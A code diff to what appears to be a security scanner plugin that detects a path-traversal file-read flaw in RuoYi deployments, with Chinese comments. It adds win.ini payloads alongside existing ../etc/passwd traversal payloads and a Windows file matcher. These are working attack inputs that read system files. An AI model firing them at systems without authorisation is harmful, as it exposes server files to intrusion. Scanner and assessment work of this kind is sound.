@@ -8,6 +8,7 @@ import re
 from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
 from core.http import join_url
 from lib.colors import no, ok
+from lib.matcher import is_windows_ini
 from lib.reachability import login_wall_reason
 from lib.reporter import emit
 from plugins.base import PluginBase
@@ -104,16 +105,20 @@ class RuoyiFileReadPathPlugin(PluginBase):
         @return: ScanResult——200 且响应含 ≥2 个 passwd 账户行（root/系统账户）为 CONFIRMED；
                  有 200 但无特征或 400/403/404 为 SAFE；重定向/其他状态与网络异常为 UNKNOWN
         """
-        # 穿越深度候选：先试与 reproduce/兄弟插件一致的深层 /profile/ 载荷（部署层级更深也能到 /），
-        # 再回退 3 层相对穿越（部分部署对 /profile/ 前缀有额外处理）
+        # 穿越深度候选 × 目标平台载荷（v1.5.6 WP2 双载荷）。
+        # 先试与 reproduce/兄弟插件一致的深层 /profile/ 载荷（部署层级更深也能到 /），
+        # 再回退 3 层相对穿越（部分部署对 /profile/ 前缀有额外处理）。
+        # Windows 目标读不到 /etc/passwd 是正常现象，不能据此判 SAFE —— 补 win.ini 载荷。
         resources = [
-            "/profile/../../../../../../../etc/passwd",
-            "../../../etc/passwd",
+            ("/profile/../../../../../../../etc/passwd", "traversal_etc_passwd"),
+            ("../../../etc/passwd", "traversal_etc_passwd"),
+            ("/profile/../../../../../../../windows/win.ini", "traversal_windows_winini"),
+            ("../../../windows/win.ini", "traversal_windows_winini"),
         ]
         requests_seen = []  # (url, code) 已拿到响应的请求
         last_200_text = None  # 最近一次 200 响应正文（用于无特征时输出判据原因）
         auth_wall = ""  # 任一载荷被登录墙拦截：本次没测到，不能判 SAFE
-        for resource in resources:
+        for resource, payload_class in resources:
             url = join_url(target, f"/common/download/resource?resource={resource}")
             try:
                 resp = session.get(url)
@@ -131,10 +136,13 @@ class RuoyiFileReadPathPlugin(PluginBase):
             code = getattr(resp, "status_code", 0)
             requests_seen.append((url, code))
 
-            # 200 + 真实 /etc/passwd 特征 → CONFIRMED
+            # 200 + 真实文件特征 → CONFIRMED（Linux 判 passwd 格式，Windows 判 win.ini 结构）
             if code == 200:
                 last_200_text = text
-                hit, evidence = _is_passwd_file(text)
+                if payload_class == "traversal_etc_passwd":
+                    hit, evidence = _is_passwd_file(text)
+                else:
+                    hit, evidence = is_windows_ini(text)
                 if hit:
                     emit(ok("存在任意文件读取漏洞（路径穿越）"))
                     return ScanResult(
@@ -147,7 +155,7 @@ class RuoyiFileReadPathPlugin(PluginBase):
                         fix=self.fix,
                         extra={
                             "vuln_type": "arbitrary_file_read",
-                            "payload_class": "traversal_etc_passwd",
+                            "payload_class": payload_class,
                             "plugin_name": "file_read_path",
                         },
                     )
@@ -177,11 +185,12 @@ class RuoyiFileReadPathPlugin(PluginBase):
                 evidence="所有穿越载荷请求均网络异常，无法判定",
             )
 
-        # 有 200 响应但全部无 passwd 特征 → SAFE（该深度读不到目标文件）
+        # 有 200 响应但全部无文件特征 → SAFE（该深度读不到目标文件）
         if 200 in codes:
-            # 复跑判据函数仅为取用其 evidence 文本作安全原因，避免另写一套判定逻辑
-            _, reason = _is_passwd_file(last_200_text or "")
-            reason = f"200 但{reason}"
+            # 复跑两个判据仅为取用其 evidence 文本作安全原因，避免另写一套判定逻辑
+            _, passwd_reason = _is_passwd_file(last_200_text or "")
+            _, ini_reason = is_windows_ini(last_200_text or "")
+            reason = f"200 但 {passwd_reason}；{ini_reason}"
         # 全部为已识别的拦截/不存在状态 → SAFE
         elif all(code in (400, 403, 404) for code in codes if code):
             reason = f"HTTP {codes[-1]} 路径被拦截或端点不存在"
